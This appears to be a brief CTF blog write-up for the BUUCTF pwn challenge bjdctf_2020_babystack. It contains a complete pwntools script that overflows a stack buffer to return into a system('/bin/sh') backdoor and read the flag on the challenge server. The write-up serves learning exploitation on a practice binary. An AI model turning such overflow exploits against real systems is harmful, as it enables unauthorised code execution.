---
title: "BUUCTF Pwn Bjdctf_2020_babystack"
date: 2020-04-03T21:23:43+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Bjdctf_2020_babystack

64位程序开启NX，有system("/bin/sh\")，简单栈溢出

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
sh = process('./bjdctf_2020_babystack')
sh = remote('node3.buuoj.cn',26495)
backdoor_addr = 0x4006e6
readsize = 30
offset = 0x10 + 0x8
sh.sendlineafter("name:",'30')
payload = 'a'*offset + p64(backdoor_addr)
sh.sendlineafter("name?",payload)
sh.sendline("cat flag")
sh.interactive()
```

